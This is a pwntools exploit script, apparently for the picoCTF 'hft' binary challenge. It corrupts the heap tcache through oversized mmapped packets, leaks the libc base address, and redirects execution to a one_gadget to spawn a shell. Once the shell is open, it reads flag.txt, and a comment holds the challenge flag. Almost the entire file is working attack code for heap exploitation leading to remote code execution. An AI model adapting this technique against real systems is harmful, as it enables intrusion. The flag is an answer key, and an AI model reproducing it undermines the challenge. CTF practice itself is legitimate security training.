#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host picoctf --port 1234 ./hft
from pwn import *
import os
import re
import subprocess

"""
python
for addr in range(0x00155555503000, 0x001555555031c8, 8):
    gdb.execute("set {{long}}{:#x} = {:#x}".format(addr, 0xCAE0000000000000 + (addr&0xFFFFFFFF)))
end
"""

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 True
host = args.HOST or 'tethys.picoctf.net'
port = int(args.PORT or 61771)
CHEAT=False
#CHEAT=True
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./hft')
#libc_path="/lib/x86_64-linux-gnu/libc.so.6"
libc_path="./libc.so.6"
    
if args.LIBC:
    os.environ['LD_PRELOAD'] = libc_path
    libc = ELF(libc_path)

os.environ['LD_LIBRARY_PATH'] = '.'

def log_outofrange(base, heap_addr):
    with open("local.txt", 'a') as f:
        f.write(f"out of bounds: {base:#x}, {heap_addr:#x}\n")

def log_inrange(base, heap_addr):
    with open("local.txt", 'a') as f:
        f.write(f"libc: {base:#x}, heap addr:{heap_addr:#x}\n")

def find_process_id(process_name):
    """Find the process ID for a given process name."""
    pids = subprocess.check_output(["pidof", process_name]).decode().split()
    return pids[0] if pids else None

def find_libc_memory_region(pid):
    """Find the memory region just above libc.so.6 for the given PID."""
    with open(f"/proc/{pid}/maps", "r") as maps_file:
        maps = maps_file.readlines()
    
    last_line = ''
    for line in maps:
        if 'libc.so.6' in line:
            break
        
        last_line = line
    print(f"Relevant line: {last_line}")
    #libc_index = next(i for i, line in enumerate(maps) if "libc.so.6" in line)
    #region = maps[libc_index].split(" ")[0]
    region = last_line.split(" ")[0]
    start, end = region.split("-")
    return int(start, 16), int(end, 16)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    with open("OUT.txt", 'a') as f:
        f.write(".\n")
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def create_chunk(chunk_size:int, prev_inuse:bool, data:bytes):
    if data is None:
        data = b''
    
    chunk = b''
    if prev_inuse:
        inuse_int = 1
    else:
        inuse_int = 0
    chunk += p64(chunk_size|inuse_int)
    chunk += fit({0: data}, length=chunk_size-8, filler=b'\x00')
    return chunk    

def create_tcache_segment(io, data, counter:int, size_chunk:int):
    num_chunks = int(size_chunk/0x1000)
    print(f'num_chunks {num_chunks}')
    for cnt in range(0,num_chunks):
        if cnt % 0x10000:
            print(f"cnt: {cnt:#x}/{num_chunks:#x}")
        LEAK = f"{counter}|{cnt}".encode()
        io.send(data)
        io.send(b'LEAKED:')
        io.send(LEAK)
        total_so_far = len(data) + len(b'LEAKED:') + len(LEAK)
        io.send(b'\x00'*(0x1000-total_so_far))

def send_smallest_tcache_segment(io, data, counter:int):
    LEAK = f"{counter}|0".encode()
    io.send(data)
    io.send(b'LEAKED:')
    io.send(LEAK)

PKT_OPT_PING  = p64(0)
PKT_OPT_ECHO  = p64(1)
PKT_OPT_TRADE = p64(2)
MMAP_THRESH = 0x21000

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#tbreak main
#b *main+142
b *main+154
b *main+190

#heap-analysis-helper
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

io = start()

if args.ASLR:
    #io.interactive()
    MAX_ITER=4096
    with open('START.txt', 'r') as f:
        data = f.read()
    USE_MMAP_BASE=int(data, 16)
    print(f'USING USE_MMAP_BASE={USE_MMAP_BASE:#x}')
else:
    #io.interactive()
    MAX_ITER=3
    USE_MMAP_BASE=0x00155555281000


if args.LOCAL:
    _, libc_base_here = find_libc_memory_region(io.pid)
    with open("local_use_bases.txt", "a") as f:
        f.write(f"{libc_base_here-0x10000000:#x}\n")
    
    if CHEAT:
        print(f'CHEATING for debug')
        USE_MMAP_BASE=libc_base_here-0x10000000
        print(f"ACTUAL LIBC_BASE: {libc_base_here:#x}")
        print(f"USING ADDRESS: {USE_MMAP_BASE:#x}")
    pass

# ________________________________this overwrites the tcache pointer_____________________________
# standard_libc... main arena is 0x23ecc8 bytes from mmaped pointer
#grab a mmapped alloc
AMOUNT=132*1024
payload = p64(AMOUNT)          #Size
payload += PKT_OPT_PING
#payload += cyclic(AMOUNT+0x1698+0x40)
payload += b'\xff'*(AMOUNT+0x1698+0x40)
# Default 0x0015555530d000 for my NOASLR. 0x00155555200000
payload += p64(USE_MMAP_BASE+0x10+0x10) # need to offset to where we have our fake tcache
#payload += p64(0) #tcache_shutting_down flag
print(f'offset: {AMOUNT+0x1698+0x40:#x}')

io.sendline(payload)

#io.shutdown('send')
print(f"MAX_ITER: {MAX_ITER}")
tdata = b''
tdata += b'\x00\x01\x00\x01\x00\x01\x00\x01'
tdata += b'\x00\x01\x00\x01\x00\x01\x00\x01'
tdata += b'\x00\x01\x00\x01\x00\x01\x00\x01'
tdata += p64(0)*13
tdata += p64(USE_MMAP_BASE+0x110)
tdata += p64(USE_MMAP_BASE+0x110)
tdata += p64(USE_MMAP_BASE+0x110)
tdata += p64(USE_MMAP_BASE+0x110)
tdata += p64(USE_MMAP_BASE+0x110)
tdata += p64(USE_MMAP_BASE+0x10)
tdata += p64(USE_MMAP_BASE+0x10)
tdata += p64(USE_MMAP_BASE+0x10)
tdata += p64(USE_MMAP_BASE+0x10)
tdata += p64(USE_MMAP_BASE+0x10)
tdata += b'\x00'*(0x100-len(tdata))
assert len(tdata) == 0x100

#io.interactive()
CHUNK_SIZE=0x10000000
MAX_ITER=2
AMOUNT=CHUNK_SIZE-0x1000
for i in range(1, MAX_ITER):
    print(f'Doing number: {i}')
    payload = p64(AMOUNT)        #Size
    payload += PKT_OPT_PING
    io.send(payload)
    #send_smallest_tcache_segment(io, tdata,i)
    io.send(b'\n')
    data = io.recvuntil(b'PKT_RES]\n')
    io.clean()
#io.interactive()

print("LETS SEE IF WE CAN LAND THIS THING!!!")
io.clean()

### Lets see if we get a clean alloc two times in a row... 
# This means tcache pointer is valid zero memory
# We do it twice to really make sure we don't hang. We'll be trying a LOT
payload = p64(20)          #Size
payload += PKT_OPT_PING
io.clean()
io.sendline(payload)
data = io.recvuntil(b'PONG_OK]\n')
data = io.recvuntil(b'PKT_RES]\n')

payload = p64(20)          #Size
payload += PKT_OPT_PING
io.clean()
io.sendline(payload)
data = io.recvuntil(b'PONG_OK]\n')
data = io.recvuntil(b'PKT_RES]\n')

payload = p64(20)          #Size
payload += PKT_OPT_PING
io.clean()
io.sendline(payload)
data = io.recvuntil(b'PONG_OK]\n')
data = io.recvuntil(b'PKT_RES]\n')

print("If we're here... we survived.")
"""
try:
    io.interactive()
except e:
    sys.exit(1)
"""


print(f'WRITING TCACHE DATA')
# Alloc smallest size available
payload = p64(0x21000)        #Size
payload += PKT_OPT_PING
io.send(payload)           
if args.LOCAL and CHEAT:   
    create_tcache_segment(io, tdata, 0, 0x100000)
else:
    # remote, fill as much as we can...
    create_tcache_segment(io, tdata, 0, 0x7800000)
io.send(b'\n')

print(f'Writing REQUEST FOR LEAK...')
data = io.recvuntil(b'PKT_RES]\n')
payload = p64(20)          #Size
payload += b'\x01\x00\x00\x00\x00\x00\x00\x0a'
io.clean()
io.send(payload)
#------------------------------------------------------------------------
context.log_level = 'debug'
print("Waiting for LEAKED string in response...")
io.recvuntil(b'LEAKED:')

outerloop = io.recvuntil(b'|',timeout=1)[:-1]
innerloop = io.recvuntil(b']',timeout=1)[:-1]
#counter_value = int(data)
print(f"LEAKED Counter: {outerloop}, innerloop: {innerloop}")

### This may need tweaking... But calc LIBC_BASE
#0x3000 is the default offset alloced for libc tls space...
KNOWN_OFFSET=CHUNK_SIZE+0x47000
#a = ((int(outerloop))*(CHUNK_SIZE+0x1000))-((int(innerloop))*0x1000) + 0x28000 - 0x3000
a = KNOWN_OFFSET-(0x1000*int(innerloop))
LIBC_BASE = USE_MMAP_BASE+a
print(f"a: {a:#x}, LIBC_BASE: {LIBC_BASE:#x}")

if args.LOCAL and CHEAT:
    print(f"Check if {LIBC_BASE:#x} == {libc_base_here:#x}")
    assert LIBC_BASE==libc_base_here
    pass
    
print(f"Sending Payload to overwrite tcache again")
#io.interactive()

# We have a LEAKED LIBC base...
payload = p64(0x90)          #Size
payload += PKT_OPT_PING
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += b'\x00\x01'
payload += p64(0)*13
payload += p64(LIBC_BASE+0x219000+0x90) #pick a small bin
payload += p64(LIBC_BASE+0x219000+0x90)
payload += p64(LIBC_BASE+0x219000+0x90)
payload += p64(LIBC_BASE+0x219000+0x90)
payload += p64(LIBC_BASE+0x219000+0x90)
payload += p64(USE_MMAP_BASE+0x10)
payload += p64(USE_MMAP_BASE+0x10)
payload += p64(USE_MMAP_BASE+0x10)
payload += p64(USE_MMAP_BASE+0x10)
payload += p64(USE_MMAP_BASE+0x10)

# Ruled out one_gadget with 0x219080(0x219098)

io.sendline(payload)

#io.interactive()

MAGIC_GADGET=0xebcf5
"""
0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL
"""
print(f"JUMP LOCATION: {LIBC_BASE+MAGIC_GADGET:#x}")
payload = p64(0x40)          #Size
payload += p64(LIBC_BASE+MAGIC_GADGET)
io.sendline(payload)
io.clean()


io.sendline('ls -la; cat flag.txt; echo CAESURUS')
data = io.recvuntil('CAESURUS')
print(data)
if len(data):
    with open('OUT.txt', 'a') as f:
        f.write(str(data))
        f.write('---'*80)
        f.write('\n')

io.interactive()

#picoCTF{mm4p_mm4573r_4d56d200}